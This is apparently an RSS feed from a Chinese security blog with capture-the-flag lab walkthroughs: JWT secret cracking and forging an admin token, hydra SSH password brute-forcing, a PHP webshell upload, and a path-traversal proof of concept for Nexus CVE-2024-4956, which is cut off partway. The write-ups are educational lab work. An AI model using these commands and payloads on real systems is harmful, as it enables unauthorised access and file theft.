<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>靶场 on SlimerのBlog</title><link>http://localhost:1313/categories/%E9%9D%B6%E5%9C%BA/</link><description>Recent content in 靶场 on SlimerのBlog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Slimer</copyright><lastBuildDate>Sun, 28 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml"/><item><title>【极核GetShell靶场】JWT Token 垂直越权漏洞</title><link>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BAjwt-token-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</link><pubDate>Sun, 28 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BAjwt-token-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/88.webp" alt="Featured image of post 【极核GetShell靶场】JWT Token 垂直越权漏洞" />&lt;h1 id="靶机信息">靶机信息&lt;/h1>
&lt;p>可以通过访问极核官方靶场开启靶机实验：&lt;a href="https://hackhub.get-shell.com/">极核靶场&lt;/a> -&amp;gt; 渗透测试靶场 -&amp;gt; JWT Token – 垂直越权漏洞&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153102.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞科普">漏洞科普&lt;/h1>
&lt;p>JWT Token垂直越权漏洞的核心在于服务端未正确验证令牌的签名或内容，导致攻击者可通过篡改Payload中的权限字段（如用户角色）非法提升权限。例如，当服务端未校验签名时，攻击者可直接将普通用户的&lt;code>sub&lt;/code>字段（如&lt;code>wiener&lt;/code>）修改为&lt;code>admin&lt;/code>，或修改&lt;code>sysadmin&lt;/code>字段为管理员标识（如&lt;code>Y&lt;/code>），从而绕过身份认证，访问管理员专属功能（如管理面板删除用户）。此外，若系统仅依赖客户端提供的未加密字段（如&lt;code>userInfo&lt;/code>）进行权限判断，攻击者伪造管理员令牌后可直接获得系统最高权限。该漏洞的修复需严格校验签名、限制敏感字段修改，并确保权限与令牌内容的一致性。&lt;/p>
&lt;h1 id="靶机实战">靶机实战&lt;/h1>
&lt;p>访问首页，可以看到已经有了默认用户 &lt;strong>&lt;code>user&lt;/code>&lt;/strong> ，但是没有密码。随便输入一个密码，抓取HTTP请求数据包，传输未加密。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">dev&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">api&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">login&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">Host&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">hackhub&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">com&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">52555&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">37&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">User&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Agent&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Mozilla&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">5&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">NT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Win64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x64&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">AppleWebKit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">537&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">36&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KHTML&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">like&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Gecko&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Chrome&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">130&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Safari&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">537&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">36&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">Accept&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">plain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*/*&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">8&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">Origin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//node.hackhub.get-shell.com:52555&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">Referer&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//node.hackhub.get-shell.com:52555/login?redirect=%2Findex&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">gzip&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">deflate&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">br&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Language&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">CN&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">9&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">Connection&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">keep&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">alive&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#34;username&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>进行登录请求爆破，对password字段的值进行遍历爆破。根据响应，爆破出&lt;strong>user&lt;/strong>用户的密码为 &lt;strong>&lt;code>123456&lt;/code>&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153140.png" alt="image.png">&lt;br>
使用登录凭据：&lt;strong>&lt;code>user / 123456&lt;/code>&lt;/strong> 登录系统，根据提示：Flag在管理员后台。根据靶机标题：&lt;strong>JWT Token垂直越权漏洞&lt;/strong> 提示，需要进行垂直越权到admin后台。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153155.png" alt="image.png">&lt;br>
查看登录的Cookie，发现为一串JWT：&lt;strong>&lt;code>eyJhbGciOiJIUzI1NiJ9.eyJsb2dpbl91c2VyX2tleSI6InVzZXIifQ.IKiUadJl6hUuSCnD38CVuIsl-BnGEkSEEECoDpHtFpU&lt;/code>&lt;/strong> ，该JWT就是校验当前用户身份的Token。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153211.png" alt="image.png">&lt;br>
将JWT Token丢入相关 &lt;strong>解析工具&lt;/strong> 或者 &lt;strong>网站&lt;/strong> ，这里用无影TscanPlus工具进行演示。解析后可以获取两个信息：&lt;strong>1、login_user_key是对应的用户名，可以尝试篡改为admin越权。2、存在签名校验，需要爆破秘钥。&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153231.png" alt="image.png">&lt;br>
使用无影TscanPlus的JWT秘钥破解功能，可以爆破出当前JWT的秘钥为 &lt;strong>&lt;code>123456&lt;/code>&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153245.png" alt="image.png">&lt;br>
将&lt;strong>login_user_key&lt;/strong>的值修改为&lt;strong>admin&lt;/strong>，配上正确的秘钥：&lt;strong>123456&lt;/strong>，然后重新编码，得到新的JWT：&lt;strong>&lt;code>eyJhbGciOiJIUzI1NiJ9.eyJsb2dpbl91c2VyX2tleSI6ImFkbWluIn0.1M1MhiNpVCNivAfhqsDr4NDlsAnLDriBzgpWEO2aeg0&lt;/code>&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153300.png" alt="image.png">&lt;br>
将重新编码后的JWT Token在浏览器Cookie进行替换，然后刷新网页，可以发现后台变了，现在是admin用户的管理后台了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153313.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153322.png" alt="image.png">&lt;br>
根据提示：🎃 &lt;strong>听说Flag在管理员的备注里&lt;/strong>，在&lt;strong>系统管理&lt;/strong> – &lt;strong>用户管理&lt;/strong>中，找到admin用户，点击修改，即可在备注里发现Flag。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928153334.png" alt="image.png">&lt;/p></description></item><item><title>【极核GetShell靶场】SSH - 密码爆破</title><link>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BAssh-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</link><pubDate>Sun, 28 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BAssh-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</guid><description>&lt;img src="http://localhost:1313/images/86.webp" alt="Featured image of post 【极核GetShell靶场】SSH - 密码爆破" />&lt;h1 id="前言">前言&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928112134.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞科普">漏洞科普&lt;/h1>
&lt;p>SSH爆破攻击是一种通过自动化工具（如Hydra、Medusa等）对SSH服务进行大规模密码猜测的攻击手段，其核心原理是利用预先设定的用户名和密码字典或暴力生成的字符组合，对目标服务器的SSH端口（通常是22端口）发起高频次登录尝试，直到找到正确的凭据。攻击者常采用分布式策略，通过多IP并发请求绕过单点封禁限制，并利用弱密码或默认账户（如root、admin）进行针对性破解。&lt;br>
这种攻击的危害主要体现在三个方面：&lt;/p>
&lt;ol>
&lt;li>​&lt;strong>​系统安全风险​&lt;/strong>​：一旦成功，攻击者可完全控制目标服务器，执行恶意操作（如窃取数据、植入后门或勒索软件），甚至将服务器纳入僵尸网络用于DDoS攻击或加密货币挖矿。&lt;/li>
&lt;li>​&lt;strong>​资源消耗​&lt;/strong>​：高频次登录尝试会占用大量CPU、内存和带宽资源，导致服务器性能下降甚至服务中断。&lt;/li>
&lt;li>​&lt;strong>​隐蔽性威胁​&lt;/strong>​：大量失败登录日志可能掩盖真实攻击事件，而成功入侵后植入的隐藏计划任务（如定时反弹Shell）会长期维持权限，进一步扩大攻击面。&lt;/li>
&lt;/ol>
&lt;h1 id="靶机实战">靶机实战&lt;/h1>
&lt;p>首先开启实例，获取入口，获取的地址+端口为&lt;strong>SSH服务&lt;/strong>，并非WEB服务！&lt;br>
在Kali（Linux）下可以使用 &lt;strong>&lt;code>hydra&lt;/code>&lt;/strong> 工具进行服务密码爆破，通过靶机信息已知默认用户为 &lt;strong>&lt;code>user&lt;/code>&lt;/strong>，使用如下命令进行服务密码爆破，可以获取到密码为：&lt;strong>&lt;code>123456&lt;/code>&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 示例
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">hydra&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">slimer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">桌面&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">hackhub&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">com&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">59313&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 使用方法
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">hydra&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">用户名&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">字典路径&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">协议头&lt;/span>&lt;span class="o">&amp;gt;://&amp;lt;&lt;/span>&lt;span class="nx">目标地址和端口&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928112640.png" alt="image.png">&lt;br>
在Windows上可以借助 &lt;a href="https://get-shell.com/2388.html">无影TscanPlus&lt;/a> 工具中的密码破解模块进行服务密码爆破&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928112732.png" alt="image.png">&lt;br>
修改SSH端口号，将地址填入后即可开始爆破，可以获取到密码为：&lt;strong>&lt;code>123456&lt;/code>&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928113148.png" alt="image.png">&lt;br>
使用题目信息给出的用户名和爆破获取到的密码：&lt;strong>&lt;code>user / 123456&lt;/code>&lt;/strong> 进行SSH登录。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928113005.png" alt="image.png">&lt;br>
登录后为普通用户，然后使用 &lt;strong>&lt;code>sudo -i&lt;/code>&lt;/strong> 进行提权后，查看根目录 flag文件 即可获取flag。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928113105.png" alt="image.png">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">GetShell{d433d242-ac32-4c56-93b8-5c00fe0d8b25}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【极核GetShell靶场】彩虹目录列表 任意文件上传</title><link>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link><pubDate>Sat, 27 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid><description>&lt;img src="http://localhost:1313/images/87.webp" alt="Featured image of post 【极核GetShell靶场】彩虹目录列表 任意文件上传" />&lt;h1 id="靶机信息">靶机信息&lt;/h1>
&lt;p>可以通过访问极核官方靶场开启靶机实验：&lt;a href="https://hackhub.get-shell.com/">极核靶场&lt;/a> -&amp;gt; 渗透测试靶场 -&amp;gt; 彩虹目录列表&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928150921.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928150943.png" alt="image.png">&lt;/p>
&lt;h1 id="靶机实战">靶机实战&lt;/h1>
&lt;p>首先访问靶机首页，可以找到后台管理，说明存在后台。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151008.png" alt="image.png">&lt;br>
第一种获取账号密码的方式：访问题目信息给出的Github源码地址，默认账号密码已经写在README&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151207.png" alt="image.png">&lt;br>
第二种方式可以通过对登录请求的数据包进行密码爆破。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151222.png" alt="image.png">&lt;br>
登录成功后返回首页，可以上传文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151309.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151327.png" alt="image.png">&lt;br>
其中从GITHUB可以得知这是个PHP程序，尝试直接上传PHP木马，这里使用&lt;a href="https://get-shell.com/1537.html">冰蝎WebShell工具&lt;/a>的WebShell木马进行上传。可以发现并未限制PHP文件的上传。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151352.png" alt="image.png">&lt;br>
使用冰蝎对上传的木马进行连接，可以连接成功，并且可以读取文件，读取根目录Flag文件即可获得Flag。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151439.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151625.png" alt="image.png">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">GetShell{Hanasaki-amenmachi}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【春秋云境】CVE-2024-4956复现</title><link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/</link><pubDate>Fri, 19 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="http://localhost:1313/images/81.webp" alt="Featured image of post 【春秋云境】CVE-2024-4956复现" />&lt;h1 id="靶标介绍">靶标介绍&lt;/h1>
&lt;p>Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。&lt;br>
&lt;strong>Sonatype Nexus Repository 3.0.0 - 3.68.0&lt;/strong>版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。&lt;/p>
&lt;h1 id="登录靶场">登录靶场&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250919151017.png" alt="image.png">&lt;br>
POC（少一个%2F都不行）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fflag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250919151103.png" alt="image.png">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{052c8b51-0d6c-45e6-8040-85243bf3182e}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="思路">思路&lt;/h1>
&lt;p>根据网上找到的poc&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">GET&lt;/span> &lt;span class="o">/%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span 